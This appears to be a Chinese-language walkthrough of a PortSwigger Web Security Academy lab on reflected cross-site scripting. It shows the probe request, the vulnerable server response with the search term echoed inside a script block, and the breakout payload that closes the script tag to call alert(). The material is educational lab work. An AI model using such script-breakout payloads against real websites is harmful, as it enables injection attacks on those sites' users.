# 实验：单引号和反斜杠被转义的 JavaScript 字符串上下文中的反射型 XSS

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped

本实验在搜索查询跟踪（search query tracking）功能中包含一个反射型跨站脚本漏洞。该回显发生在一段 JavaScript 字符串内部，其中单引号和反斜杠已被转义。

为了解决本实验，请执行一个跨站脚本攻击，该攻击需要跳出 JavaScript 字符串并调用 `alert` 函数。

## 步骤

探测
- 使用搜索功能，查询独特字符串 `h1pva7vk`
    ```http
    GET /?search=h1pva7vk HTTP/2
    ```

    - 服务器响应

        ```html
        <h1>0 search results for 'h1pva7vk'</h1>

        <script>
            var searchTerms = 'h1pva7vk';
            document.write('<img src="/resources/images/tracker.gif?searchTerms=' + encodeURIComponent(searchTerms) + '">');
        </script>
        ```
        - 上下文：JS 字符串中

    - 浏览器额外渲染
        ```html
        <img src="/resources/images/tracker.gif?searchTerms=h1pva7vk">
        ```

测试
- 输入特殊字符
    - 发现尖括号未被转义，单引号被转义

攻击
- 构造 HTML 元素闭合标签
    ```html
    </script><script>alert();//
    ```
